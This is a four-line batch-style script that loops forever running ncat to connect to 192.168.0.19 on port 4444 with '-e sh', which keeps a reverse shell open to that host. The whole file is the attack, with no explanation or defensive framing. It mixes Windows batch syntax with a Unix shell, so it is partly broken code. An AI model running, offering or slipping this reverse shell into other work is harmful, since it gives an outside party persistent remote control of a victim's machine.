:loop
rem | choice /c:AB /T:A,30 >nu
ncat 192.168.0.19 4444 -e sh
goto loop
